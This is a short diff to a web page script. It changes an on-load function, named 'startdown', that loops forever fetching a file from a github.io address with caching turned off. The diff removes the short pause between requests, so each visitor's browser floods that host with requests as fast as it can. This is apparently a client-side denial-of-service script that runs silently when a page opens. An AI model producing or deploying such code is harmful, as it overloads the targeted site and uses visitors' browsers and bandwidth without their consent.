@@ -37,13 +37,7 @@ if(resppage = true){
 
 window.onload = async function startdown(){
   while(true) {
-    await delay(10);
-    await fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"})
-  }
-}
-window.onload = async function startdown2(){
-  while(true) {
-    await delay(10);
+    //await delay(10);
     await fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"})
   }
 }
